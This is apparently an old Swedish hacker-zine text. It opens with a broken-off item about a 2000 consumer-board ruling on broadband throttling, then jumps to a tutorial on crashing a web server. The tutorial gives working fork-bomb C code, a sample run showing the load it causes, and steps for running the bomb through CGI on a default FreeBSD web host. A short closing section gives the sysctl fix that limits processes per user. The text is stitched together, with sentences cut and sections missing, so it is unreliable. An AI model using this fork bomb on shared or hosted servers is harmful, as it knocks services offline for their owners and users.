 Bredband är bredband
 
 Thalamus/Bostadsbolaget  fälldes  den  2000-12-19 av Allmänna Reklam-

 för  en användare. Hastighetssänkningen var ett straff för att kunden
 haft  en  nerström  på  mer  än  1,5 Gb inom en vecka. Bostadsbolaget
 Göteborg som  hade kontraktet med bredbandsleverantören Thalamus samt
 med  slutkunden  uppmanas  av Allmänna reklamationsnämnden att betala
 tillbaka den avgift kunden betalat för höghastighetsinternet under de
 givna  perioderna,  samt betala ett skäligt skadestånd för besvär som
 hastighetssänkningen orsakat.

 sänka  hastigheten  hos  kund  eftersom begränsningen på 1,5 Gb/vecka
 inte  fanns  med i avtalet. "Anser nämnden att ett sådant villkor som
 inte tydligt  anger  vilken  typ  av begränsning som kan komma ifråga
 eller  vad  som  avses med onormalt brukande normalt sett är att anse
 oskäligt." (citat ur Arn beslut 2000-12-19)
 
 Bakgrund:  Thalamus  levererade  s k  bredband  eller  höghastighets-
 internet till slutkunden för Bostadsbolagets räkning.

 1.1 Denna texten
 
  Jag  ska  starta  från  noll och visa hur du kan sänka en server med
 hjälp utav ett perl-script som skapar och kompilerar en bit C kod som
 i sin tur använder fork.  Själv testade jag detta mot en av mina egna
 burkar.  Börja  från noll med att installera en _blank_ freeBSD inst-
 allation  och sen installerar apache xxxxxx. Alltså en default confad
 burk  med  rättigheter  för  att köra cgi-scripts. Ungefär så ser mer
 eller mindre de flesta små webhotell på unices ut.
 
 Denna text illustrerar en enkel attack mot en webserver i informativt
 syfte.

 1.3 Terori för attacken
 
  Innan  du  läser denna delen så läs ncode's guide rörande fork() och
 manualen i unice.
 
 Det  vi  ska  göra är att med våra rättigheter att köra cgi's köra en
 bit perl-kod,  som i sin tur med 'nobody' rättigheter skapar en fil i
 /tmp/  som sedan kompileras med cc och körs. Skriptet som körs kommer
 att forka processen till processtable är full. fork() skapar en kopia
 av processen  som körs, eftersom det är en kopia så kommer kopian att
 skapa  ännu  en  kopia. Vi kommer skapa så många processer så att det
 inte  finns utrymme för fler, och därmed kan inte ens administratören
 köra `kill`  för  att döda vår kod. Här ett enkelt program som klonar
 sig själv, både parent och child process skriver en rad.
 
 #include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 
 main()
 {
  fork();  /* Här forkar vi processen */
  printf("Både childen och parentprocessen skriver detta\n");
  /* båda processerna behandlar detta */
  return (0);
 }
 
  Om  vi  skapar  ett program som är en while() loop med fork() instr-
 uktionen.  Då får vi det vi vill uppnå, en okontrollerbar fork. Koden
 är väldigt enkel :
 
 #include &lt;stdio.h&gt;
 #include &lt;unistd.h&gt;
 
 int a = 0;
 
 main()
 {
  fork();  /* snabba upp lite */
  while(a!=1){fork();} /* skapa childs i oändligheten */
  return (0);
 }
 
 Testa att köra denna koden på en burk om du kan, tryck ^c efter ett
 litet tag (5-6 sek) och kolla dina 'loads' med `uptime`. Så här såg
 det ut för mig:
 
 h4x# ./a.out
 ^C
 h4x# uptime
  4:28PM  up 2 days, 16:58, load averages: 68.89, 21.97, 10.48
 h4x#
 
  Detta  är  som du ser _enorma_ loads. Nu börjar det nog klarna för
 dig hur vi skall gå tillväga, ett problem kvarstår.
 
 1) Vi behöver kunna köra CGI's.
 2) Vi  behöver  execute-rättigheter för binärerna vi kommer använda
    som perl & cc.
 3) Vi behöver skrivrättigheter i /tmp.
 
 1 - I vårt fall går det
 2 - ...
 h4x# ls -l /usr/bin/perl;ls -l /usr/bin/cc
 -r-xr-xr-x  3 root  wheel  10164 Nov 20 12:00 /usr/bin/perl
 -r-xr-xr-x  2 root  wheel  69432 Nov 20 11:59 /usr/bin/cc
 
 3 - ...
 h4x# ls -dl /tmp
 drwxrwxrwt  2 root  wheel  512 Jan  6 16:33 /tmp
 
  Inga problem med andra ord, detta var _standard_ installationen av
 FreeBSD utan modifieringar av rättigheter, många admins tänker inte
 på  att spärra cc för 'all others' och perl är ju förutsättning för
 att ha webhotell i stort sätt.

 1.6 Körning av koden
 
  Ladda  upp  till  CGI  mappen  med  mask 755.  ( rwx rx rx ). Ta 2
 sessioner i din browser och kör fork.pl och kolla sen med uptime.pl
 vad  som händer.  Burken  går  på knäna och till slut blir process-
 tabellen  full  så  inte fler saker  kan exekveras. Enda sättet att
 stoppa fork.pl är antingen genom en existerande killprocess (ganska
 ovanligt ;).  Eller  genom ^c  om man kör det i en terminal. Burken
 krashar  på  sätt  och vis inte men den är obrukbar för världen och
 administratören måste oftast starta om den. En annan sak man kan ha
 i  åtanke  är att /tmp/ flushas i de flesta unices vid uppstart 'by
 default'.

 1.8 Do not let it be you!
 
  Att  hindra  folk  från  att  köra något liknande på din maskin är
 väldigt  simpelt.  Det  finns ett  program  i  unixsystem som heter
 'sysctl' som låter oss göra en mängd inställningar på låg nivå,
 t.ex.  att sätta restriktioner på hur många processer ett och samma
 UID  får  ta upp. Kolla i ditt system hur många processer samma UID
 för köra igenom att skriva :
 
 monster# sysctl kern.maxprocperuid
 kern.maxprocperuid: 819
 
  Alltså vi kan köra igång 819 processer från samma UID... hur många
 klarar då systemet av att ha igång samtidigt?
 
 monster# sysctl kern.maxproc
 kern.maxproc: 820
 
  Oups! Inte bra...  endast  en  reserverad  processkörning, och som
 bekant tar PID 1 denna? (init):
 
 monster# ps aux | grep "/sbin/init" |tail -n 1
 root  1  0.0  0.1  528  152  ??  ILs  4Jan01  0:06.04 /sbin/init --
 
 Ställ  om  kern.maxprocperuid  till lämpligt värde i 'integer'-form,
 själv satte  jag  100  vilket är  ruskigt många processer för en an-
 vändare.
 
 monster# sysctl -w kern.maxprocperuid=100
 kern.maxprocperuid: 819 -&gt; 100
 monster# sysctl kern.maxprocperuid
 kern.maxprocperuid: 100
 
  Sådär...  Nu  kan  vi  ?endast? starta 100 processer per UID, detta
 borde förhindra denna typ av attack.
